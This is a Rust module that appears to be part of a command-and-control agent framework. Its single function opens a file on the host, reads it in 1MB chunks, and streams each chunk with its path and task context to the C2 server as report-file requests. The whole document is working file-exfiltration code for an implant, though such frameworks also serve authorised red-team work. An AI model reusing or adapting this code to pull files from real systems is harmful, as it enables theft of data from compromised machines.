use alloc::boxed::Box;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec;
use alloc::vec::Vec;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::fs::File;
use std::io::Read;

const CHUNK_SIZE: usize = 1024 * 1024; // 1MB

struct FileChunkIterator {
    file: File,
    path: String,
    context: Context,
    buffer: Vec<u8>,
}

impl FileChunkIterator {
    fn new(path: String, context: Context) -> Result<Self, String> {
        let file = File::open(&path).map_err(|e| e.to_string())?;
        Ok(Self {
            file,
            path,
            context,
            buffer: vec![0; CHUNK_SIZE],
        })
    }
}

impl Iterator for FileChunkIterator {
    type Item = Result<c2::ReportFileRequest, String>;

    fn next(&mut self) -> Option<Self::Item> {
        match self.file.read(&mut self.buffer) {
            Ok(0) => None, // EOF
            Ok(n) => {
                let chunk_data = self.buffer[..n].to_vec();

                let metadata = eldritch::FileMetadata {
                    path: self.path.clone(),
                    ..Default::default()
                };

                let file_msg = eldritch::File {
                    metadata: Some(metadata),
                    chunk: chunk_data,
                };

                let context_val = match &self.context {
                    Context::Task(tc) => {
                        Some(report_file_request::Context::TaskContext(tc.clone()))
                    }
                    Context::ShellTask(stc) => {
                        Some(report_file_request::Context::ShellTaskContext(stc.clone()))
                    }
                };

                Some(Ok(c2::ReportFileRequest {
                    context: context_val,
                    chunk: Some(file_msg),
                    kind: c2::ReportFileKind::Ondisk as i32,
                }))
            }
            Err(e) => Some(Err(e.to_string())),
        }
    }
}

pub fn file(agent: Arc<dyn Agent>, context: Context, path: String) -> Result<(), String> {
    let iterator = FileChunkIterator::new(path, context)?;
    agent.report_file(Box::new(iterator)).map(|_| ())
}
